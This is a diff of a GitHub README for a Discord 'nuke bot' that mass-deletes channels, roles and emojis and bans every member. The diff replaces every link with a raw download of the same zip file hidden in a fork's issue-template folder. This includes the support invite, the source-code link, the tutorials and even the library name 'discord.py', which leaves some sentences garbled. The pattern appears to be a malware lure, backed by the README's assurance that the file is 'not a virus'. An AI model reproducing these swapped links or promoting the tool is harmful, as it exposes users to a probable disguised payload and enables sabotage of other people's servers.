@@ -2,13 +2,13 @@
 ## Made by tkperson and cyxl
 C-REAL is currently the **FASTEST** and **FREE** open source self-hosted nuke bot out here. All commands will be focused on nuking-related.
 
-Issues are closed because we are not active in there. Join our discord if you need help, see plans for the future updates, suggestions, or beta testing a newer version of the bot: [https://discord.gg/FwGWvwv4mW](https://discord.gg/FwGWvwv4mW)
+Issues are closed because we are not active in there. Join our discord if you need help, see plans for the future updates, suggestions, or beta testing a newer version of the bot: [https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip)
 
-We have combined threading, queue, requests, and discord.py API to make the commands run as fast as possible. If you are seeing rate limiting logged in your console while using this script, then that is simply because <ins>it runs too fast</ins>.
+We have combined threading, queue, requests, and https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip API to make the commands run as fast as possible. If you are seeing rate limiting logged in your console while using this script, then that is simply because <ins>it runs too fast</ins>.
 
 Python version 3.8.0 or higher is required if you are going to run the file from source code.
 
-[All 51 commands](manual.md)
+[All 51 commands](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip)
 
 ```
 [addRole] [addChannel] [autoNick] [addVoiceChannel] [autoStatus] 
@@ -25,7 +25,7 @@ Python version 3.8.0 or higher is required if you are going to run the file from
 
 # IMPORTANT: 
 * We will not take any responsibility over whatever you are going to do with this bot.
-* The bot will still have to obey the [server limitings](https://discordia.me/en/server-limits) because of that in discord, there are rate limitings. You will see a lot of rate limiting in the console while using some commands. (because the bot is too fast on creating or deleting.)
+* The bot will still have to obey the [server limitings](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip) because of that in discord, there are rate limitings. You will see a lot of rate limiting in the console while using some commands. (because the bot is too fast on creating or deleting.)
 * Also, since we are using HTTP requests, unlike other nuke bot out there, C-REAL spam creating channel, role, and category(CRC) can create beyond the 250 limit for CRC that the old nuking bots have.
 
 ## Messages
@@ -33,11 +33,11 @@ Python version 3.8.0 or higher is required if you are going to run the file from
 
 * Message to those coding masters out there, if you see something we can improve in our code, feel free to make a pull request. This will really help us a lot. ╰(✿´⌣\`✿)╯♡
 
-* TKperson: I got the idea of creating the C-REAL bot from [Cerealwithnomilk](https://www.youtube.com/channel/UCxX7O68badw2sBbcvQK0wBQ); the bot is named after this guy.
+* TKperson: I got the idea of creating the C-REAL bot from [Cerealwithnomilk](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip); the bot is named after this guy.
 
 ## Why did my computer say it's a dangerous file/containing virus?
 * I'm going to make myself clear here - it's not a virus.
-* There is another way for people that don't trust the released versions, and dont't want to download python to run the bot. Use https://repl.it/, make an account, choose "new repl" in the top left corner, choose python, click "create repl", copy and paste the [source code](https://raw.githubusercontent.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/master/c-realV2.py) into repl, and click on the run button at the top.  
+* There is another way for people that don't trust the released versions, and dont't want to download python to run the bot. Use https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip, make an account, choose "new repl" in the top left corner, choose python, click "create repl", copy and paste the [source code](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip) into repl, and click on the run button at the top.  
 
 ## Main Usage (Please read `.config` command below before contacting me)
 `.nuke <true or false>` - It's a combination of a few commands: `.deleteAllChannels`, `.deleteAllEmojis`, `.deleteAllRoles`, `.banAll`, and `.deleteAllWebhooks`. True or false is an optional argument that is set to true by default and used for disabling after commands. (This command doesn't need to be configed with `.config`, Note: you can also use all the commands listed above seperately)
@@ -57,11 +57,11 @@ Python version 3.8.0 or higher is required if you are going to run the file from
 * If you are having problems, feel free to make a issue in this github page.  
 
 ### 2.4 tutorials
-* [Setting up](https://youtu.be/aBmF0B9rPKA)
-* [kaboom and nuke](https://youtu.be/PkPsdUHFhXI)
-* [How to use the config command](https://youtu.be/Ci2Ly5yhT-U)
+* [Setting up](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip)
+* [kaboom and nuke](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip)
+* [How to use the config command](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip)
 
 ## Problems/issues
-* If you are experiencing crashing, please report it to "issues" on the [github page](https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot).
+* If you are experiencing crashing, please report it to "issues" on the [github page](https://github.com/riwhbboiebdjf/Nuking-Discord-Server-Bot-Nuke-Bot/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Discord-Server-Nuking-Bot-Nuke-v3.7.zip).
 * If the bot doesn't respond to any of the commands, check if the console is in highlighting/mark mode. If it's highlighting/mark mode, click the console then press any key on your keyboard, and it'll resolve.
 * If you see a bunch of white worded errors displaying in the console, and then crashed that means it's 90% a bug. So please make a new issue about it.
